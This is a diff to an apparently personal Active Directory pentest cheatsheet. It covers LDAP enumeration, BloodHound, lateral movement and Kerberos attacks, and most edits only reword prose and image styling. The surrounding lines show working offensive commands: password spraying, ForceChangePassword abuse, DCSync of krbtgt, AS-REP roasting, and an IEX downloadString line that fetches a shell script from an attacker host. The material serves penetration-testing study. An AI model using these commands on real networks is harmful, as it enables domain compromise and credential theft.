@@ -42,7 +42,7 @@
   .section-flow-13 .nested-dropdown-container,.section-flow-14 .nested-dropdown-container{background-color:hsl(320,34%,48%);}
   .index{background-color:hsl(320,34%,48%);}
   .index-btn{background-color:hsl(320,34%,34%);}
-  .cheatsheet-content img{max-width:520px;width:100%;height:auto;display:block;margin:0.5rem 0;}
+  .cheatsheet-content img{max-width:520px;width:100%;height:auto;display:block;margin:0.5rem auto;}
   .cheatsheet-content figure{margin:0.8rem 0;padding:0;}
   .cheatsheet-content .wide-mindmap img{max-width:none;}
   .cheatsheet-content h2{margin-top:3.5rem;margin-bottom:1rem;}
@@ -243,8 +243,8 @@
       <div class="container cheatsheet-container">
         <div class="cheatsheet-content">
 <h2 id="cape-ldap-1">1. Active Directory LDAP</h2>
-<p>LDAP is a query protocol used by Active Directory. Every request against the domain controller begins with a bind that establishes an identity, and by default an authenticated domain user has read access to most of the tree without any additional privileges. The directory holds users, groups, computers, OUs, GPO links, certificate templates, delegation flags, and almost every other configuration primitive, which makes it the largest single source of information reachable from any credentialed host.</p>
-<p>The bind mode determines what a query is allowed to see. Anonymous binds against a modern domain controller are constrained to the root DSE, but the response still lists the naming contexts, supported controls, and schema location, which is usually enough to structure the queries that follow. An authenticated bind removes the restriction. The search base and object class filter then decide the scope of the response, and choosing them carefully is what keeps results focused rather than overwhelming.</p>
+<p>LDAP is Active Directory's query protocol. Every request begins with a bind, and any authenticated domain user has read access to almost the entire tree without additional privileges. That tree carries users, groups, computers, OUs, GPO links, certificate templates, and delegation flags. It is the single richest information source available from any credentialed host, and one bind unlocks it.</p>
+<p>Bind mode determines the visibility of the query. Anonymous binds against a modern DC are constrained to the root DSE, but that response still lists naming contexts, supported controls, and the schema location, which is usually enough to shape the next query. Authenticated binds remove the constraint. Base and object-class filter then set the scope of the response, and choosing them carelessly returns the entire tree.</p>
 
 <h3 id="cape-ldap-naming-contexts">1.1 Naming Contexts</h3>
 <p>Every LDAP server exposes a set of naming contexts (also called root DSE entries) describing the partitions it hosts. Querying with an empty base and <code>-s base</code> returns the metadata needed to build subsequent searches:</p>
@@ -271,18 +271,18 @@
 <h3 id="cape-ldap-authenticated-enumeration">1.3 Authenticated Enumeration</h3>
 <p>Authenticated binds unlock the vast majority of AD attributes. Provide the bind DN with <code>-D</code>, the password with <code>-w</code>, and set the base to the domain naming context:</p>
 <pre><code class="language-bash">ldapsearch -H ldap://&lt;dc-fqdn&gt; -x -D '&lt;user&gt;@&lt;domain.local&gt;' -w '&lt;password&gt;' -b "DC=&lt;domain&gt;,DC=&lt;tld&gt;" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F":" '{print $2}'</code></pre>
-<p>The same pattern extends to any object class, including <code>group</code>, <code>computer</code>, <code>msDS-GroupManagedServiceAccount</code>, and <code>pKICertificateTemplate</code>. The filter syntax follows RFC 4515 and is powerful enough to deserve its own subsection.</p>
+<p>The same call shape works for any object class. Swap the filter for <code>group</code>, <code>computer</code>, <code>msDS-GroupManagedServiceAccount</code>, or <code>pKICertificateTemplate</code> and keep going. The filter language itself is RFC 4515, and it deserves its own subsection below because you will lean on it every engagement.</p>
 
 <h3 id="cape-ldap-filters">1.4 LDAP Search Filters</h3>
-<p>Filters are the second half of every LDAP search. The base tells the DC where to look, the filter tells it what to return. Choosing filters carefully separates a targeted query from one that dumps the whole tree.</p>
-<p>The syntax comes from RFC 4515. Every filter is wrapped in parentheses, and Boolean operators sit in prefix position, meaning the operator character appears at the start of the group before its operands:</p>
+<p>Filters are half of every search. The base tells the DC where to look; the filter tells it what to return. Careless filters produce noise; careful ones produce the answer.</p>
+<p>Syntax follows RFC 4515. Every filter is wrapped in parentheses, and Boolean operators sit in prefix position: the operator character comes at the start of the group, before its operands.</p>
 <pre><code class="language-bash">(&lt;attribute&gt;=&lt;value&gt;)          # simple equality
 (&amp;(...)(...))                  # AND, all sub-filters must match
 (|(...)(...))                  # OR, any sub-filter matches
 (!(...))                       # NOT, negates the enclosed filter</code></pre>
 
 <h4 id="cape-ldap-filters-object">1.4.1 Object Class Filters</h4>
-<p>Narrowing by <code>objectClass</code> or <code>samAccountType</code> is the fastest way to trim a result set to a single object type. <code>samAccountType</code> tends to be more precise for the built-in account categories because the value enumeration is closed:</p>
+<p>Filter by <code>objectClass</code> or <code>samAccountType</code> to trim the result set to a single object type. <code>samAccountType</code> is preferable for the built-in account categories because its value enumeration is closed, which removes ambiguity from the query.</p>
 <pre><code class="language-bash">(objectClass=user)
 (objectClass=group)
 (objectClass=computer)
@@ -300,7 +300,7 @@
 (description=*password*)       # dangerous but often productive</code></pre>
 
 <h4 id="cape-ldap-filters-bitwise">1.4.3 Bitwise Filters</h4>
-<p>The <code>userAccountControl</code> attribute packs a set of account flags into a single integer, so equality matching does not work. The <code>LDAP_MATCHING_RULE_BIT_AND</code> extension (OID <code>1.2.840.113556.1.4.803</code>) tests specific bits inside the value:</p>
+<p><code>userAccountControl</code> is a bitfield packed into a single integer, so plain equality matching does not work. Individual bits are tested with the <code>LDAP_MATCHING_RULE_BIT_AND</code> extension (OID <code>1.2.840.113556.1.4.803</code>):</p>
 <pre><code class="language-bash">(userAccountControl:1.2.840.113556.1.4.803:=2)         # ACCOUNTDISABLE
 (userAccountControl:1.2.840.113556.1.4.803:=32)        # PASSWD_NOTREQD
 (userAccountControl:1.2.840.113556.1.4.803:=65536)     # DONT_EXPIRE_PASSWORD
@@ -308,11 +308,11 @@
 (userAccountControl:1.2.840.113556.1.4.803:=4194304)   # DONT_REQ_PREAUTH (AS-REP roastable)</code></pre>
 
 <h4 id="cape-ldap-filters-inchain">1.4.4 Recursive Group Membership</h4>
-<p>The <code>LDAP_MATCHING_RULE_IN_CHAIN</code> extension (OID <code>1.2.840.113556.1.4.1941</code>) walks nested group memberships automatically. One query returns the transitive membership of a group instead of resolving each nested subgroup by hand:</p>
+<p><code>LDAP_MATCHING_RULE_IN_CHAIN</code> (OID <code>1.2.840.113556.1.4.1941</code>) walks nested group memberships automatically. A single query returns the transitive membership of a group instead of resolving each subgroup manually:</p>
 <pre><code class="language-bash">(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;)</code></pre>
 
 <h4 id="cape-ldap-filters-practical">1.4.5 Practical Combined Filters</h4>
-<p>The filters below cover the questions asked on almost every internal engagement.</p>
+<p>The filters below cover the questions worth asking on almost every internal engagement.</p>
 <p>Kerberoastable users (user accounts with any SPN set):</p>
 <pre><code class="language-bash">(&amp;(samAccountType=805306368)(servicePrincipalName=*))</code></pre>
 <p>AS-REP roastable users (pre-auth disabled):</p>
@@ -331,7 +331,7 @@
 <pre><code class="language-bash">(memberOf:1.2.840.113556.1.4.1941:=CN=&lt;group&gt;,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;)</code></pre>
 
 <h4 id="cape-ldap-filters-usage">1.4.6 Applying Filters with ldapsearch</h4>
-<p>Wrap the filter in single quotes so the shell does not interpret wildcards or parentheses. Attribute names after the filter restrict which fields the DC returns:</p>
+<p>Wrap the filter in single quotes so the shell does not interpret wildcards or parentheses. Attribute names supplied after the filter restrict which fields the DC returns; omit them and every attribute on the object comes back.</p>
 <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
     '(&amp;(samAccountType=805306368)(servicePrincipalName=*))' \
     sAMAccountName servicePrincipalName</code></pre>
@@ -342,22 +342,22 @@
     sAMAccountName</code></pre>
 
 <h4 id="cape-ldap-anr">1.4.7 Ambiguous Name Resolution and PrimaryGroupID</h4>
-<p>Two AD-specific LDAP behaviors worth remembering. Ambiguous Name Resolution (ANR) matches a search value against multiple attributes at once (<code>givenName</code>, <code>sn</code>, <code>displayName</code>, <code>sAMAccountName</code>, <code>proxyAddresses</code>, and a handful of others), which is faster than composing an OR by hand:</p>
+<p>Two AD-specific LDAP behaviours are worth committing to memory. Ambiguous Name Resolution (ANR) matches a single search value against a fixed list of attributes at once, including <code>givenName</code>, <code>sn</code>, <code>displayName</code>, <code>sAMAccountName</code>, and <code>proxyAddresses</code>. One query replaces a hand-written OR of half a dozen sub-filters:</p>
 <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; '(anr=admin)' sAMAccountName displayName</code></pre>
-<p><code>PrimaryGroupID</code> is where an account's primary group RID lives. It does not show up in <code>memberOf</code>, so the standard membership query misses it. To resolve the primary group, translate the RID into a group SID:</p>
+<p><code>PrimaryGroupID</code> stores an account's primary group RID, and it does not appear in <code>memberOf</code>. Standard membership queries silently miss it, which is the reliable source of "how did that user still have access?" mysteries. Translate the RID into a group SID to resolve the primary group:</p>
 <pre><code class="language-bash"># Pull the primary group RID from the account
 ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; '(sAMAccountName=&lt;user&gt;)' primaryGroupID
 # 513 = Domain Users (default), 512 = Domain Admins, 515 = Domain Computers, 516 = Domain Controllers</code></pre>
 
 <h4 id="cape-ldap-windapsearch">1.4.8 windapsearch</h4>
-<p><a href="https://github.com/ropnop/windapsearch">windapsearch</a> is a Python wrapper around common LDAP enumeration filters. It hides the RFC 4515 syntax behind flags for the common questions (users, groups, computers, GPOs, trusts, spns) and outputs cleanly:</p>
+<p><a href="https://github.com/ropnop/windapsearch">windapsearch</a> is a Python wrapper that hides the RFC 4515 syntax behind flags for the common enumeration questions (users, groups, computers, GPOs, trusts, SPNs) and formats output cleanly:</p>
 <pre><code class="language-bash">windapsearch -d &lt;domain.local&gt; --dc-ip &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' --da        # Domain Admins
 windapsearch -d &lt;domain.local&gt; --dc-ip &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' --spns      # Service Principal Names
 windapsearch -d &lt;domain.local&gt; --dc-ip &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' --unconstrained-delegation
 windapsearch -d &lt;domain.local&gt; --dc-ip &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' --gpos     # every GPO</code></pre>
 
 <h3 id="cape-ldap-rpcclient">1.5 rpcclient over MSRPC</h3>
-<p><code>rpcclient</code> talks Windows MSRPC to a DC over SMB. It sometimes returns information LDAP won't and is invaluable when LDAP is filtered. Anonymous and authenticated modes are both supported:</p>
+<p><code>rpcclient</code> talks Windows MSRPC to a DC over SMB. Sometimes it hands back things LDAP won't, and when LDAP is filtered it is the only game left. Both anonymous and authenticated modes work:</p>
 <pre><code class="language-bash">rpcclient -U="" -N &lt;dc-ip&gt;
 rpcclient -U="<user>" &lt;dc-ip&gt;</code></pre>
 <p>Once connected, a handful of commands cover most enumeration needs:</p>
@@ -375,9 +375,9 @@ netshareenum            # SMB shares
 enumprivs               # user privileges</code></pre>
 
 <h3 id="cape-ldap-rid-brute">1.6 RID Brute Force</h3>
-<p>Relative Identifiers (RIDs) are the tail of a SID and are allocated sequentially. Even when username enumeration is blocked, querying RIDs one-by-one via SAMR often returns the account name. NetExec (<code>nxc</code>) automates this against SMB:</p>
+<p>RIDs are the tail of every SID and get handed out sequentially, which is the whole reason RID-brute works. Even when username enumeration is locked down, asking SAMR "what's the name for RID 1000, 1001, 1002..." usually pulls the account list back out. NetExec (<code>nxc</code>) does it against SMB:</p>
 <pre><code class="language-bash">crackmapexec smb <dc-ip> -u "" -p "" --rid-brute</code></pre>
-<p>Once a user list is built, spray a candidate password across every account. Lockout policies (from <code>getuserdompwinfo</code>) tell you how aggressive you can be:</p>
+<p>Once a user list is built, spray a candidate password across every account. Consult the lockout policy first (from <code>getuserdompwinfo</code>): that number sets the ceiling on how aggressive the spray can be before accounts start locking out and the noise reaches the SOC.</p>
 <pre><code class="language-bash">crackmapexec smb <dc-ip> -u users.txt -p "password"</code></pre>
 
 <h4 id="cape-ldap-methodology">Methodology</h4>
@@ -858,7 +858,7 @@ dsquery group "cn=users, dc=&lt;domain&gt;, dc=&lt;tld&gt;"</code></pre>
 
 <h3 id="cape-powerview-adalanche">2.14 Adalanche</h3>
 <p>Adalanche is a modern alternative to BloodHound with strong Kerberos and delegation support. Its web UI leans on a single graph view that groups edges by category, which I sometimes find easier to read than BloodHound's pathfinding for wide-open environments. Collection is a single Go binary invocation:</p>
-<p style="text-align:center;"><img src="/assets/images/cape/adalanche-graph.png" alt="Adalanche graph view of Active Directory relationships" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/adalanche-graph.png" alt="Adalanche graph view of Active Directory relationships" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">./adalanche collect activedirectory --domain <domain.local> \
   --username <user>@<domain.local> --password '<password>' \
   --server <dc-fqdn></code></pre>
@@ -901,7 +901,7 @@ $DomainUsers | ? {$_.name -match "admin"}</code></pre>
 <h2 id="cape-bloodhound-3">3. Active Directory BloodHound</h2>
 <p>BloodHound converts the AD relationship graph into something you can actually query. Under the hood it is Neo4j; on top of that sits a client that ships pre-built Cypher queries for the questions attackers actually ask, starting with "what is the shortest path from here to Domain Admin?". That single query has quietly ended more assessments than any zero-day I have ever handled.</p>
 <p>Two collector families exist. SharpHound is the C# implementation for on-premises AD, distributed as an executable with an older PowerShell wrapper. AzureHound covers Entra ID. Both feed the same graph. Most of the operator work happens up front, choosing a collection method the environment's sensors will tolerate, and getting a matching-version collector onto a domain-joined host without lighting up the SOC.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/bloodhound-analytics-graph.png" alt="BloodHound analytics view showing the domain graph" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/bloodhound-analytics-graph.png" alt="BloodHound analytics view showing the domain graph" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-bloodhound-installation">3.1 Installation</h3>
 <p>Kali packages BloodHound and Neo4j:</p>
@@ -950,7 +950,7 @@ SharpHound.exe --CollectionMethods Session,LoggedOn --Domain &lt;domain.local&gt
 MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 
 <h3 id="cape-bloodhound-sharphound">3.4 SharpHound Collectors</h3>
-<p style="text-align:center;"><img src="/assets/images/cape/sharphound-collection-methods.png" alt="SharpHound collection methods and their coverage of AD data sources" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/sharphound-collection-methods.png" alt="SharpHound collection methods and their coverage of AD data sources" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Three collectors are commonly used:</p>
 <table class="custom-table">
 <thead><tr><th>Collector</th><th>Description</th></tr></thead>
@@ -1027,9 +1027,9 @@ MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 
 <h3 id="cape-bloodhound-unconstrained-delegation">3.10 Unconstrained Delegation</h3>
 <p>Computers with unconstrained delegation cache the TGT of every user who authenticates to them. Compromise the box, extract the tickets, then impersonate any user in the domain. Domain Admins land in scope the moment I can coerce a DC into authenticating.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/unconstrained-delegation-settings.png" alt="Computer account showing 'Trust this computer for delegation to any service' in ADUC" style="max-width:70%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/unconstrained-delegation-settings.png" alt="Computer account showing 'Trust this computer for delegation to any service' in ADUC" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Constrained delegation is the safer cousin: the account can only impersonate to a specific set of listed SPNs. Even that gets abused when the SPN list includes something reachable and the S4U2Self / S4U2Proxy extensions are usable.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/constrained-delegation-properties.png" alt="Account delegation tab showing constrained delegation with allowed SPNs" style="max-width:65%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/constrained-delegation-properties.png" alt="Account delegation tab showing constrained delegation with allowed SPNs" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">(c:Computer {UnconstrainedDelegation:true})</code></pre>
 <pre><code class="language-bash">(c:Computer {UnconstrainedDelegation:true})</code></pre>
 <p>Custom Cypher for non-DC computers with unconstrained delegation:</p>
@@ -1042,7 +1042,7 @@ RETURN p</code></pre>
 
 <h3 id="cape-bloodhound-shortest-path">3.11 Shortest Path to Domain Admins</h3>
 <p>The killer feature. One Cypher query maps every route from any starting node to Domain Admins, and the client draws it for you.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/bloodhound-pathfinding.png" alt="BloodHound pathfinding graph showing shortest path to Domain Admins" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/bloodhound-pathfinding.png" alt="BloodHound pathfinding graph showing shortest path to Domain Admins" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">p=shortestPath((n)-[*1..]-&gt;(m))
 RETURN p</code></pre>
 <p>Combined with the built-in filters for group memberships, sessions, ACLs, and administrative rights, this surfaces the concrete steps between your foothold and full domain compromise.</p>
@@ -1074,7 +1074,7 @@ RETURN p</code></pre>
 
 <h3 id="cape-bloodhound-exploiting-genericwrite">3.16 Exploiting GenericWrite</h3>
 <p>GenericWrite lets an attacker rewrite most attributes of an object. Three high-impact abuses come up repeatedly on assessments:</p>
-<p style="text-align:center;"><img src="/assets/images/cape/shadow-credentials-pkinit.png" alt="Shadow Credentials attack flow using msDS-KeyCredentialLink and PKINIT" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/shadow-credentials-pkinit.png" alt="Shadow Credentials attack flow using msDS-KeyCredentialLink and PKINIT" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <table class="custom-table">
 <thead><tr><th>Abuse</th><th>Description</th></tr></thead>
 <tbody>
@@ -1098,7 +1098,7 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>' -Credential $C
 
 <h3 id="cape-bloodhound-aces">3.17 Exploiting ACEs and Permission Delegations</h3>
 <p>Access Control Entries (ACEs) populate DACLs on nearly every AD object. Misconfiguration turns them into escalation paths. A classic example is IT Support holding <code>ForceChangePassword</code> over Domain Users. That is legitimate for helpdesk password resets, but it also lets a helpdesk operator reset a Domain Admin's password if the tiering is not enforced.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/acl-abuse-mindmap.png" alt="Mindmap of exploitable ACE types and their downstream primitives" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/acl-abuse-mindmap.png" alt="Mindmap of exploitable ACE types and their downstream primitives" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Types of ACEs worth memorizing:</p>
 <table class="custom-table">
 <thead><tr><th>ACE</th><th>Effect</th></tr></thead>
@@ -1123,7 +1123,7 @@ Get-ADGroupMember -Identity "Tier 2 Admins"</code></pre>
 
 <h3 id="cape-bloodhound-forcechangepassword">3.20 Exploiting ForceChangePassword</h3>
 <p>With IT Support holding <code>ForceChangePassword</code> over Tier 2 Admins, target a Tier 2 admin and reset their password with <code>Set-ADAccountPassword</code>:</p>
-<p style="text-align:center;"><img src="/assets/images/cape/bloodhound-forcechangepassword.png" alt="BloodHound edge showing ForceChangePassword relationship between users" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/bloodhound-forcechangepassword.png" alt="BloodHound edge showing ForceChangePassword relationship between users" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-powershell">Get-ADGroupMember -Identity "Tier 2 Admins"
 $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force
 Set-ADAccountPassword -Identity target.user -NewPassword $Password -Reset</code></pre>
@@ -1252,9 +1252,9 @@ SharpHound.exe --CollectionMethods All --Stealth --ExcludeDomainControllers</cod
   </li>
 </ul>
 <h2 id="cape-lateral-movement-4">4. Windows Lateral Movement</h2>
-<p>Lateral movement is what happens between the first foothold and the objective. Every technique here trades stealth for reliability along a slightly different axis; the right one to pick depends on the sensor stack in the environment, whether logging is centralised, and whether the account you plan to reuse is expected to appear on the destination host at all.</p>
+<p>Lateral movement is everything between the first foothold and the objective. Every technique in this module trades stealth for reliability differently, and the right choice depends on the sensor stack, the state of centralised logging, and whether the account you plan to reuse is expected to appear on the destination host in the first place.</p>
 <p>Two questions I ask before touching a target: what account material do I have (password, NTLM hash, Kerberos ticket, cert), and what remote execution channels does the target actually accept (WinRM, DCOM, SMB service creation, task scheduler). The intersection of those two sets is usually a much shorter list than it looks.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/network-topology.png" alt="Lateral movement across a segmented network topology" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/network-topology.png" alt="Lateral movement across a segmented network topology" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-lateral-psremoting">4.1 PowerShell Remoting</h3>
 <p>PSRemoting rides WinRM on TCP 5985 (HTTP) or 5986 (HTTPS). Prereqs: WinRM enabled on the target (<code>Enable-PSRemoting -Force</code>), valid credentials, and network access. In-domain use is smoothest with Kerberos; cross-domain expect NTLM or CredSSP.</p>
@@ -1269,7 +1269,7 @@ Enter-PSSession -Session $sess</code></pre>
 <p>Stateful command execution with session-scoped variables:</p>
 <pre><code class="language-powershell">Invoke-Command -Session $sess -ScriptBlock { $ps = Get-Process }
 Invoke-Command -Session $sess -ScriptBlock { $ps }</code></pre>
-<p>Always clean up with <code>Remove-PSSession $sess</code>. Common gotchas, access denied usually means wrong domain or wrong permission; WinRM not configured is fixed with <code>Enable-PSRemoting -Force</code>; name resolution issues respond to FQDNs or <code>Test-WSMan</code>.</p>
+<p>Always clean up with <code>Remove-PSSession $sess</code>. Three failure modes come up repeatedly. Access denied is almost always the wrong domain or an under-privileged user. WinRM not configured is fixed by <code>Enable-PSRemoting -Force</code> on the target. Name resolution failures respond to FQDNs or a preliminary <code>Test-WSMan</code>.</p>
 
 <h3 id="cape-lateral-psexec">4.2 PsExec</h3>
 <p>PsExec is a Sysinternals classic. Its flow:</p>
@@ -1475,7 +1475,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://attacker-ip:8080/shell.ps1') } -Credential $cred -Computer localhost</code></pre>
 
 <h3 id="cape-lateral-port-forwarding">4.12 Port Forwarding</h3>
-<p>Once inside a segment, pivoting through the foothold host gives access to internal services from the attacker workstation.</p>
+<p>Once you own a host inside a segment, pivoting through it turns the whole internal network into something your Kali box can reach directly.</p>
 
 <h4 id="cape-lateral-ssh-remote">4.11.1 SSH Remote Port Forwarding</h4>
 <p>If the attacker can't reach a server directly but the foothold PC-1 can, remote port forwarding pushes that port back to the attacker's box. <code><attacker-ip></code> is the attacker, <code><target-ip>:3389</code> is the internal RDP target:</p>
@@ -1757,8 +1757,8 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
   </li>
 </ul>
 <h2 id="cape-kerberos-6">6. Kerberos Attacks</h2>
-<p>Kerberos is the default authentication protocol in Windows domains. Its ticket-based design and stronger crypto were meant to raise the bar over NTLM, but the attack surface has stayed wide open. Pre-authentication weaknesses, service ticket cracking, delegation abuse, and outright ticket forgery all belong here. Understanding the six-step flow between client, KDC, and service is the prerequisite for every attack that follows; skip that and the tooling starts feeling like magic.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/kerberos-auth-flow.png" alt="Kerberos authentication flow between client, KDC, and target service" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p>Kerberos replaced NTLM as the default in Windows domains and was supposed to close the credential-reuse door. It didn't. Pre-authentication is still crackable, service tickets are still cracked offline, delegation still gets abused, and if you own <code>krbtgt</code> you can forge whatever you want. Every attack in this list makes more sense once you have the six-step client &harr; KDC &harr; service exchange in your head, so start there.</p>
+<p style="text-align:center;"><img src="/assets/images/cape/kerberos-auth-flow.png" alt="Kerberos authentication flow between client, KDC, and target service" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-kerberos-terminology">6.1 Common Terminology</h3>
 <table class="custom-table">
@@ -1778,7 +1778,7 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 </table>
 
 <h3 id="cape-kerberos-flow">6.2 Kerberos Authentication Overview</h3>
-<p style="text-align:center;"><img src="/assets/images/cape/kerberos-key-distribution.png" alt="Kerberos Key Distribution Center handling AS-REQ, TGS-REQ, and AP-REQ exchanges" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/kerberos-key-distribution.png" alt="Kerberos Key Distribution Center handling AS-REQ, TGS-REQ, and AP-REQ exchanges" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>The six-step flow of a full authentication:</p>
 <table class="custom-table">
 <thead><tr><th>Step</th><th>Message</th><th>What happens</th></tr></thead>
@@ -1835,7 +1835,7 @@ setspn -T domain.local -Q ldap/*</code></pre>
 
 <h3 id="cape-kerberos-asrep-roast">6.6 AS-REP Roasting</h3>
 <p>Kerberos pre-authentication requires the client to prove identity before the KDC issues a ticket. When pre-auth is disabled on an account, the KDC hands back an AS-REP encrypted with the target user's long-term key, which is derived from their password. That AS-REP can be cracked offline, and the account never needs to be logged in for it to happen.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/kerberos-preauth-flow.png" alt="Kerberos pre-authentication flow with encrypted timestamp" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/kerberos-preauth-flow.png" alt="Kerberos pre-authentication flow with encrypted timestamp" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Fetch AS-REPs for a list of users:</p>
 <pre><code class="language-bash">python3 GetNPUsers.py -dc-ip [ip] <domain.local>/ -usersfile [list-of-found-users-from-command-above]</code></pre>
 
@@ -1934,7 +1934,7 @@ done</code></pre>
 
 <h3 id="cape-kerberos-silver-tickets">6.11 Silver Tickets</h3>
 <p>Silver Tickets are forged TGSs signed with the service account's key. They are harder to detect because the DC is never contacted, and harder to defend against because rotating every machine account password on a schedule is operationally painful.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/unpac-the-hash-flow.png" alt="UnPAC-the-Hash flow extracting an NTLM hash from a PKINIT PAC" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/unpac-the-hash-flow.png" alt="UnPAC-the-Hash flow extracting an NTLM hash from a PKINIT PAC" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Properties worth remembering:</p>
 <ul>
 <li>TGS is signed by the machine account of the targeted host.</li>
@@ -1999,7 +1999,7 @@ getTGT.py -hashes :&lt;ntlm-hash&gt; domain.local/&lt;user&gt;</code></pre>
 
 <h3 id="cape-kerberos-unconstrained-chain">6.13 Unconstrained Delegation Attack Chain</h3>
 <p>Unconstrained delegation on a host means every user who authenticates to it forwards their own TGT for the host to store locally. A compromised host with unconstrained delegation becomes a TGT collector. Coerce a Domain Controller (or any high-value account) to authenticate to that host and its TGT lands in LSASS.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/unconstrained-delegation-settings.png" alt="Unconstrained delegation setting on a computer account" style="max-width:70%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/unconstrained-delegation-settings.png" alt="Unconstrained delegation setting on a computer account" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Enumerate hosts with unconstrained delegation via LDAP or PowerView:</p>
 <pre><code class="language-bash"># PowerView: computer accounts with TRUSTED_FOR_DELEGATION set
 Get-DomainComputer -Unconstrained -Properties samaccountname, dnshostname</code></pre>
@@ -2047,7 +2047,7 @@ mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt</code></pre>
 <tr><td>S4U2Proxy</td><td>Exchange of that forwardable ticket for a ticket to any SPN in <code>msDS-AllowedToDelegateTo</code>.</td><td>Service ticket to the downstream target as the impersonated user.</td></tr>
 </tbody>
 </table>
-<p style="text-align:center;"><img src="/assets/images/cape/constrained-delegation-properties.png" alt="Constrained delegation properties in ADUC" style="max-width:65%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/constrained-delegation-properties.png" alt="Constrained delegation properties in ADUC" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
